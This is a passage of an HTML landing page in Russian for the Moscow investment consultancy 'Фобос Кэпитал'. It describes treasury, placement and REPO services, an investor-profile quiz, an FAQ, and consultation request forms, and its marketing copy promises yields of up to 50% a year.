							<p>Мы&nbsp;осуществляем консультации по&nbsp;размещению свободных денежный средств на&nbsp;рынке ценных бумаг, что поможет получить доходность значительно выше банковских депозитов</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Любой, заранее определённый,  срок инвестирования;</li>
							<li>Высокая доходность при сохранении первоначальных сроков;</li>
							<li>Формирования портфеля в рамках вашего риск-профиля;</li>
							<li>Возможность отслеживать состояние своих инвестиций;</li>
							<li>Минимальные потери доходности при досрочном расформировании портфеля.</li>
						</ul>
					</div>
				</div>
				<div class="service" id="fin">
					<div>
						<div class="service-title clearfix">
							<h4>Организация работы казначейства</h4>
							<p>С&nbsp;учетом нашего многолетнего опыта наша команда поможет вам оптимизировать структуры Казначейства, снизить расходы и&nbsp;встать на&nbsp;верный путь развития</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Анализ структуры, сильных и слабых сторон;</li>
							<li>Выявление ваших приоритетов;</li>
							<li>Формирование экспертного мнения;</li>
							<li>Предоставление отчетов;</li>
							<li>Непосредственная помощь во внедрении изменений;</li>
							<li>Помощь и контроль за процессом на всех его этапах.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Консалтинг при первичных размещениях</h4>
							<p>Мы&nbsp;поможем с&nbsp;поиском подписчиков на&nbsp;вашу бумагу</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Широкий круг контрагентов;</li>
							<li>Многолетний опыт;</li>
							<li>Подготовка аналитических материалов для инвесторов;</li>
							<li>Юридическое сопровождение;</li>
							<li>Поддержка и консультирование в любой момент времени.</li>
						</ul>
					</div>
					<div>
						<div class="service-title clearfix">
							<h4>Эффективное размещение ликвидности</h4>
							<p>Cделки РЕПО и&nbsp;Buy/Sell с&nbsp;поиском сторон для привлечения/размещения свободных денежных средств</p>
							<!-- <a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Обзор продуктов</a>  -->
						</div>
						<ul>
							<li>Широкий круг контрагентов с установленными лимитами;</li>
							<li>Поиск минимальной ставки для наших клиентов;</li>
							<li>Работаем с любыми бумагами;</li>
							<li>Возможность сделок Buy/Sell, при которых не блокируется часть капитала;</li>
							<li>Поддержка и консультирование в любой момент времени.</li>
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="b b-6">
		<div class="b-block">
			<h2 class="b-title">НАМ ДОВЕРЯЮТ</h2>
			<div class="b-partners"></div>
		</div>
	</div>
	<div class="b b-7">
		<div class="b-block">
			<p>В&nbsp;настоящий момент мы&nbsp;работаем с&nbsp;широким кругом контрагентов, от&nbsp;маленьких фондов до&nbsp;крупнейших банков. И&nbsp;этот список постоянно расширяется. Мы&nbsp;всегда открыты к&nbsp;сотрудничеству и&nbsp;будем рады Вашим предложениям.</p>
			<a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Стать партнером</a>
		</div>
	</div>
	<div class="b b-8">
		<div class="b-block b-white-block">
			<h2 class="b-title">ваша Прибыль</h2>
			<h3>Выберите оптимальное для Вас инвестиционное решение</h3>
			<ul class="nav clearfix">
				<li data-block="#invest-1">Компания</li>
				<li data-block="#invest-2">Валюта</li>
				<li data-block="#invest-3">Срок</li>
				<li data-block="#invest-4">Риск-профиль</li>
				<li data-block="#invest-5">Объем инвеcтиций</li>
				<li data-block="#invest-6">Ожидаемая прибыль</li>
			</ul>
		</div>
		<div class="b-back invest-test" id="invest-1">
			<div class="b-icon">
				<i class="sprite sprite-icon-1"></i>
				<p>Вы</p>
			</div>
			<div class="b-block">
				<div>	
					<h3>Кем из предложенных ниже Инвесторов Вы являетесь?</h3>
					<ul class="clearfix b-checkboxes">
						<li><input type="radio" name="invest" id="id-1" value="Частное лицо" checked><label for="id-1">Частное лицо</label></li>
						<li><input type="radio" name="invest" id="id-2" value="Компания"><label for="id-2">Компания</label></li>
						<li><input type="radio" name="invest" id="id-3" value="Финансовый институт"><label for="id-3">Финансовый институт</label></li>
					</ul>
					<div>
						<a href="#" class="b-red-butt b-next-butt" data-next="#invest-2">Далее</a>
					</div>
				</div>
			</div>
		</div>
		<div class="b-back invest-test" id="invest-2">
			<div class="b-icon">
						<i class="sprite sprite-icon-2"></i>
						<p>Валюта</p>
					</div>
			<div class="b-block">
				<div>
					
					<h3>В какой валюте Вы хотите Инвестировать?</h3>
					<ul class="clearfix b-checkboxes">
						<li><input type="radio" name="currency" id="id-4" value="Рубли" checked><label for="id-4">Рубли</label></li>
						<li><input type="radio" name="currency" id="id-5" value="Доллары"><label for="id-5">Доллары</label></li>
						<li><input type="radio" name="currency" id="id-6" value="Евро"><label for="id-6">Евро</label></li>
						<li><input type="radio" name="currency" id="id-7" value="Иная валюта"><label for="id-7">Иная валюта</label></li>
					</ul>
					<div>
						<a href="#" class="b-red-butt b-next-butt" data-next="#invest-3">Далее</a>
					</div>
				</div>
			</div>
		</div>
		<div class="b-back invest-test" id="invest-3">
			<div class="b-icon">
						<i class="sprite sprite-icon-3"></i>
						<p>Срок</p>
					</div>
			<div class="b-block">
				<div>
					
					<h3>На какой срок Вы готовы инвестировать?</h3>
					<ul class="clearfix b-checkboxes">
						<li><input type="radio" name="time" id="id-8" value="Краткосрочный" checked><label for="id-8">Краткосрочный<span>(до 1 месяца)</span></label></li>
						<li><input type="radio" name="time" id="id-9" value="Среднесрочный"><label for="id-9">Среднесрочный<span>(от 1 месяца до полугода)</span></label></li>
						<li><input type="radio" name="time" id="id-10" value="Долгосрочный"><label for="id-10">Долгосрочный<span>(более года)</span></label></li>
					</ul>
					<div>
						<a href="#" class="b-red-butt b-next-butt" data-next="#invest-4">Далее</a>
					</div>
				</div>
			</div>
		</div>
		<div class="b-back invest-test" id="invest-4">
			<div class="b-icon">
						<i class="sprite sprite-icon-4"></i>
						<p>Риск-профиль</p>
					</div>
			<div class="b-block">
				<div>
					
					<h3>Выберите Ваш Риск&ndash;Профиль</h3>
					<ul class="clearfix b-checkboxes">
						<li><input type="radio" name="risk" id="id-11" value="Консервативный" checked><label for="id-11">Консервативный<span>(Портфель составляется из федеральнго займа и квазису эмитентов (ВЭБ, ВТБ, Газпром, Роснефть)</span></label></li>
						<li><input type="radio" name="risk" id="id-12" value="Умеренный"><label for="id-12">Умеренный<span>(Портфель составляется из федеральнго займа и квазису эмитентов (ВЭБ, ВТБ, Газпром, Роснефть)</span></label></li>
						<li><input type="radio" name="risk" id="id-13" value="Агрессивный"><label for="id-13">Агрессивный<span>(Портфель составляется из федеральнго займа и квазису эмитентов (ВЭБ, ВТБ, Газпром, Роснефть)</span></label></li>
					</ul>
					<div>
						<a href="#" class="b-red-butt b-next-butt" data-next="#invest-5">Далее</a>
					</div>
				</div>
			</div>
		</div>
		<div class="b-back invest-test" id="invest-5">
			<div class="b-icon">
						<i class="sprite sprite-icon-5"></i>
						<p>Объем инвестиций</p>
					</div>
			<div class="b-block">
				<div>
					
					<h3>Какой Ваш предполагаемый Объем Инвестиций?</h3>
					<ul class="clearfix b-checkboxes">
						<li><input type="radio" name="size" id="id-14" value="До 1 000 000" checked><label for="id-14">До 1 000 000</label></li>
						<li><input type="radio" name="size" id="id-15" value="от 1 000 000 до 10 000 000"><label for="id-15">от 1 000 000 до 10 000 000</label></li>
						<li><input type="radio" name="size" id="id-16" value="Более 10 000 000"><label for="id-16">Более 10 000 000</label></li>
					</ul>
					<div>
						<a href="#" class="b-red-butt b-next-butt" data-next="#invest-6">Далее</a>
					</div>
				</div>
			</div>
		</div>
		<div class="b-back invest-test" id="invest-6">
			<div class="b-icon">
						<i class="sprite sprite-icon-6"></i>
						<p>Ожидаемая прибыль</p>
					</div>
			<div class="b-block">
				<div>
					
					<h3>Какую прибыль Вы ожидаете от инвестиций?</h3>
					<ul class="clearfix b-checkboxes">
						<li><input type="radio" name="profit" id="id-17" value="1% - 15%" checked><label for="id-17">1% - 15%</label></li>
						<li><input type="radio" name="profit" id="id-18" value="15% - 20%"><label for="id-18">15% - 20%</label></li>
						<li><input type="radio" name="profit" id="id-19" value="20% - и более"><label for="id-19">20% - и более</label></li>
					</ul>
					<div>
						<a href="#" class="b-red-butt b-next-butt" data-next="#invest-final">Далее</a>
					</div>
				</div>
			</div>
		</div>
		<div class="b-back" id="invest-final">
			<div class="final-back">
				<div class="b-block">
					<h4>Ваша стратегия «Рациональная»</h4>
					<div class="clearfix">
						<div class="left percent">25%</div>
						<ul class="right">
							<li>Автоматическое исполнение стратегии</li>
							<li>Диверсифицированный портфель ценных бумаг</li>
							<li>Налоговые преимущества</li>
							<li>Регулярная ребалансировка портфеля</li>
							<li>Персональная поддержка и рекомендации</li>
							<li>Онлайн отчетность</li>
						</ul>
					</div>
					<ul class="stats">
						<li>          
							<div>
								<span>43%</span>
								<div style="height:43px;"></div>
							</div>
							<h5>Сбербанк</h5>
						</li>
						<li>          
							<div>
								<span>19%</span>
								<div style="height:19px;"></div>
							</div>
							<h5>Газпром</h5>
						</li>
						<li>          
							<div>
								<span>17%</span>
								<div style="height:17px;"></div>
							</div>
							<h5>Роснефть</h5>
						</li>
						<li>          
							<div>
								<span>13%</span>
								<div style="height:13px;"></div>
							</div>
							<h5>ГМК Норникель</h5>
						</li>
						<li>          
							<div>
								<span>10%</span>
								<div style="height:10px;"></div>
							</div>
							<h5>Сургутнефтегаз</h5>
						</li>
						<li>          
							<div>
								<span>9%</span>
								<div style="height:9px;"></div>
							</div>
							<h5>ВТБ</h5>
						</li>
						<li>          
							<div>
								<span>8.5%</span>
								<div style="height:8.5px;"></div>
							</div>
							<h5>Уралсиб</h5>
						</li>
						<li>          
							<div>
								<span>6%</span>
								<div style="height:6px;"></div>
							</div>
							<h5>Северсталь</h5>
						</li>
						<li>          
							<div>
								<span>5%</span>
								<div style="height:5px;"></div>
							</div>
							<h5>Лукойл</h5>
						</li>
						<li>          
							<div>
								<span>3%</span>
								<div style="height:3px;"></div>
							</div>
							<h5>РЖД</h5>
						</li>
					</ul>
					<div class="clearfix butts">
						<a href="#" class="b-white-butt b-red-butt b-next-butt"  data-next="#invest-1">Изменить ответы</a>
						<a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Мне подходит</a>
					</div>
				</div>
			</div>
			<div class="solution">
				<div class="b-block">
					<h4>Как мы создаем наши инвестиционные решения</h4>
					<ul class="clearfix">
						<li>
							<div style="background-image: url('i/sol-1.png');"></div>
							<h5>Знакомство</h5>
							<p>Расскажите Нам о&nbsp;своих целях и&nbsp;потребностях. А&nbsp;мы&nbsp;подготовим для Вас персональную инвестиционную стратегию, введем Вас в&nbsp;курс дела, проконсультируем по&nbsp;всемвытекающим вопросам.</p>
						</li>
						<li>
							<div style="background-image: url('i/sol-2.png');"></div>
							<h5>Начало работы</h5>
							<p>Для начала работы Вам не&nbsp;потребуется изучать огромное количество информации, связанной с&nbsp;инвестиционными процессами и&nbsp;инвестиционной отраслью в&nbsp;целом. Мы&nbsp;самостоятельно выполним все необходимые действия для реализации Вашего инвестиционного решения в&nbsp;соответствии со&nbsp;всеми правилами и&nbsp;стандартами, обязательными в&nbsp;нашей отрасли.</p>
						</li>
						<li>
							<div style="background-image: url('i/sol-3.png');"></div>
							<h5>Получение прибыли</h5>
							<p>С&nbsp;самого начала нашей работы у&nbsp;Вас есть прямой онлайн доступ ко&nbsp;всем процессам проводимой нами работы. Более того, только Вы&nbsp;имеете возможность ввода / вывода средств по&nbsp;Вашему счету. Вся заработанная нами прибыль для Вас по&nbsp;окончании инвестиционной стратегии вместе с&nbsp;первоначально вложенным капиталом возвращается непосредственно на&nbsp;Ваш текущий / расчетный счет.</p>
						</li>
					</ul>
				</div>
			</div>
			<div class="solution-back">
				<div class="sol-text">
					<h5>Отчетность</h5>
					<p>В любой точке мира вы можете моментально узнать о состоянии своего счета и о всех осуществленных транзакциях, обратившись к ежедневному отчету или напрямую к своему персональному менеджеру.</p>
				</div>
				<div class="sol-text">
					<h5>Результат</h5>
					<p>Разработанные нами инвестиционные решения помогают нашим клиентам получать высокие доходы и при этом контролировать сопутствующие им риски на заданном уровне. </p>
				</div>
				<div class="solution-black">
					<ul class="clearfix">
						<li>Доходность до 50% годовых
							<p>Инвестиционные решения приносят до 50% годовых в зависимости от выбранной стратегии. </p>
						</li>
						<li>Наш опыт – Ваш комфорт
							<p>Мы используем все наши знания и опыт работы с фондовым рынком, информацию, получаемую нами здесь и сейчас, а также актуальный анализ рыночной конъюнктуры для созданиярешений, которые лучше всего подойдут Вам в текущих условиях.</p>
						</li>
						<li>Контроль рисков
							<p>Под риском мы всегда понимаем потерю средств в инвестиционном процессе в результате его выхода из-под контроля. Одна из главных задач в нашей работе – не допустить возникновения таких ситуаций. Контроль над рисками не отделим от процесса получения прибыли!</p>
						</li>
					</ul>
				</div>
				<div class="sol-butt"><a href="#" class="b-red-butt fancy" data-block="#b-popup-consult">Готовые решения</a></div>
			</div>
			<div class="faq">
				<div class="b-block">
					<h4>Остались вопросы?</h4>
					<div id="accordion">
						<h5>Насколько мне удобно/комфортно с вами сотрудничать?</h5>
						<div>
							<p>В&nbsp;компании мы&nbsp;вырабатываем особый подход к&nbsp;каждому клиенту. С&nbsp;самого начала сотрудничества мы&nbsp;используем персональное консультирование для определения Ваших пожеланий и&nbsp;потребностей. Вы&nbsp;будете получать ежедневные отчеты о&nbsp;проделанной работе и&nbsp;о&nbsp;том, как работает Ваш капитал. Все переводы и&nbsp;выплаты осуществляются в&nbsp;строго оговоренные сроки. Каждый клиент индивидуален и&nbsp;важен для нас.</p>
						</div>
						<h5>Как вы контролируете качество своей работы?</h5>
						<div>
							<p>Качество работы любой инвестиционной компании определяют в&nbsp;первую очередь ее&nbsp;клиенты и&nbsp;ее&nbsp;репутация. Наша репутация для нас очень важна, поэтому со&nbsp;своей стороны мы&nbsp;прилагаем все усилия, чтобы сотрудничество с&nbsp;нами было для Вас максимально комфортным. За&nbsp;годы работы нами была разработана эффективная система <nobr>риск-менеджмента</nobr> и&nbsp;внутреннего контроля, направленная на&nbsp;минимизацию рисков, возникающих в&nbsp;инвестиционных процессах. Также, для исключения неприятных недоразумений мы&nbsp;работаем только с&nbsp;надежными и&nbsp;хорошо зарекомендовавшими себя на&nbsp;финансовом рынке контрагентами, в&nbsp;которых полностью уверены. На&nbsp;постоянной основе мы&nbsp;проводим собственный анализ рынка и&nbsp;публикуем результаты в&nbsp;открытом доступе на&nbsp;нашем сайте. Более детальные отчеты о&nbsp;проделанной работе направляются непосредственно нашим клиентам.</p>
						</div>
						<h5>Как я буду отслеживать свой капитал?</h5>
						<div>
							<p>Наши клиенты отслеживают состояние своего счета любым удобным для них способом, начиная с&nbsp;ежедневного брокерского отчета, заканчивая личным общением с&nbsp;персональным менеджером.</p>
						</div>
						<h5>Могу ли я изменить инвестиционную стратегию?</h5>
						<div>
							<p>Мы&nbsp;отслеживаем состояние стратегий наших клиентов в&nbsp;реальном времени. По&nbsp;Вашему желанию мы&nbsp;можем в&nbsp;любое время переформировать Ваш инвестиционный портфель в&nbsp;соответствии с&nbsp;новыми потребностями и&nbsp;целями. При досрочном изменении инвестиционной стратегии возможно возникновение дополнительных транзакционных издержек.</p>
						</div>
						<h5>А что если мне не понравится?</h5>
						<div>
							<ul>
								<li>Каждый клиент имеет право в&nbsp;любой момент приостановить рабочий процесс. Причины могут быть разными: срочно необходимы деньги или не&nbsp;устраивает формат сотрудничества. Во&nbsp;втором случае, мы&nbsp;обсуждаем с&nbsp;клиентами их&nbsp;замечания и, если не&nbsp;приходим к&nbsp;договоренности&nbsp;&mdash; возвращаем средства</li>
								<li>Мы&nbsp;прилагаем максимальные усилия для того, чтобы досрочное прекращение инвестиционной стратегии не&nbsp;привело к&nbsp;возникновению у&nbsp;клиента дополнительных расходов и&nbsp;непредвиденных убытков</li>
								<li>Мы&nbsp;производим окончательный расчет на&nbsp;следующий рабочий день после заявления клиента и&nbsp;будем рады вновь возобновить сотрудничество в&nbsp;любое удобное для клиента время</li>
							</ul>
						</div>
					</div>
					<h4>Заполните заявку для получения консультации</h4>
					<form action="kitsend.php" method="POST" id="b-form-ticket" data-thank="Вы оставили заявку на консультацию" data-block="#b-popup-2">
						<div class="clearfix">
							<label>Ваш город</label><input type="text" name="1">
							<input type="hidden" name="1-name" value="Город">
						</div>
						<div class="clearfix">
							<label>Ваше имя</label><input type="text" name="name">
						</div>
						<div class="clearfix">
							<label>Вы</label><select name="2"><option>Частное лицо</option></select>
							<input type="hidden" name="2-name" value="Клиент">
						</div>
						<div class="clearfix">
							<label>Телефон для&nbsp;связи</label><input type="text" name="phone" required>
						</div>
						<div class="clearfix">
							<label>Электронная почта</label><input type="text" name="email">
						</div>
						<input type="hidden" name="subject" value="Заявка на консультацию">
						<div class="form-butt">
							<a class="ajax b-red-butt" onclick="$('#b-form-ticket').submit(); return false;" >Отправить заявку</a>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
	<div class="b b-9">
		<div class="b-block clearfix">
			<h3 class="left">Обратитесь к&nbsp;экспертам «Фобос Кэпитал»</h3>
			<div class="right">
				<div class="b-phone-contact">+7 (495) 287-27-71</div>
				<div class="b-email-contact">info@foboscap.com</div>
				<div class="b-place-contact">г. Москва, ул. Беговая,<br>д.3 стр.1</div>
			</div>
		</div>
	</div>
	<div class="b b-10">
		<div class="b-map" id="map_canvas"></div>
	</div>
	<div class="b b-11">
		<div class="b-block clearfix">
			<div class="clearfix b-footer-menu-cont">
				<ul class="b-footer-menu left clearfix">
					<li><a href="#" class="b-go" data-block=".b-3">О нас</a></li>
					<li><a href="#" class="b-go" data-block=".b-4">Наше мнение</a></li>
					<li><a href="#" class="b-go" data-block=".b-5">Услуги</a></li>
					<li><a href="#" class="b-go" data-block=".b-6">Клиенты и Партнеры</a></li>
					<li><a href="#" class="b-go" data-block=".b-8">Прибыль</a></li>
				</ul>
				<div class="right">
					<a href="#" class="b-soc-butt"><img src="i/soc/fb.png" alt=""></a>
					<a href="#" class="b-soc-butt"><img src="i/soc/tw.png" alt=""></a>
					<a href="#" class="b-soc-butt"><img src="i/soc/vk.png" alt=""></a>
				</div>
			</div>
			<div class="b-footer-cont clearfix">
				<!-- <a class="left b-book-cont fancy-img" href="i/back-1.jpg">
					Наши лицензии
				</a> -->
				<div class="left b-copy-cont">
					ООО “Фобос Кэпитал”.<br>Профессиональный участник рынка ценных бумаг.
				</div>
				<div class="right b-dev-cont">Дизайн сайта <a href="http://www.vikagrits.ru/" target="_blank">www.vikagrits.ru</a></div>
			</div>
		</div>
	</div>
	<div style="display:none;">
		<div id="b-popup-1">
			<div class="b-popup">
				<div class="b-head">Вы выбрали дату</div>
				<div class="b-popup-back">
					<form action="kitsend.php" method="POST" id="b-form-1" data-block="#b-popup-2" data-thank="Вы оставили заявку на встречу">
						<div class="clearfix b-data-cont">
							<h3 class="left" id="date-text"></h3>
							<input type="text" name="1" class="b-data-input right" id="actualDate" placeholder="Укажите дату" required>
							<input type="hidden" name="1-name" value="Дата">
							<span id="refresh-date"></span>
						</div>
						<div class="b-popup-form">
							<input type="text" class="b-input-name" id="name" name="name" placeholder="Представьтесь пожалуйста" required/>
							<input type="text" id="phone" name="phone" placeholder="Ваш телефон" required/>
							<input type="text" name="email" placeholder="Ваш email" required/>
							<input type="hidden" name="subject" value="Назначить встречу"/>
							<a class="ajax b-red-butt" onclick="$('#b-form-1').submit(); return false;" >Назначить встречу</a>
						</div>
					</form>
				</div>
			</div>
		</div>
		<div id="b-popup-consult">
			<div class="b-popup">
				<div class="b-head">Заполните заявку для получения консультации</div>
				<div class="b-popup-back">
					<form action="kitsend.php" method="POST" id="b-form-consult" data-thank="Вы оставили заявку на консультацию" data-block="#b-popup-2">
						<div class="b-popup-form consult">
							<input type="text" name="1" placeholder="Ваш город">
							<input type="hidden" name="1-name" value="Город">
							<input type="text" name="name" placeholder="Ваше имя">
							<select name="2"><option>Частное лицо</option></select>
							<input type="hidden" name="2-name" value="Клиент">
							<input type="text" name="phone" placeholder="Ваш телефон" required>
							<input type="text" name="email" placeholder="Ваш E-mail">
							<input type="hidden" name="subject" value="Заявка на консультацию">
							<div class="form-butt">
								<a class="ajax b-red-butt" onclick="$('#b-form-consult').submit(); return false;" >Отправить заявку</a>
							</div>
						</div>
					</form>
				</div>
			</div>
		</div>
		<div id="b-popup-2">
			<div class="b-thanks b-popup">
				<h3>Вы оставили заявку</h3>
				<h4>В ближайшее время мы свяжемся с Вами</h4>
			</div>
		</div>
		<div id="b-popup-error">
			<div class="b-thanks b-popup">
				<h3>Ошибка отправки!</h3>
				<h4>Приносим свои извинения. Пожалуйста, попробуйте отправить Вашу заявку позже.</h4>
			</div>
		</div>
	</div>
</body>
</html>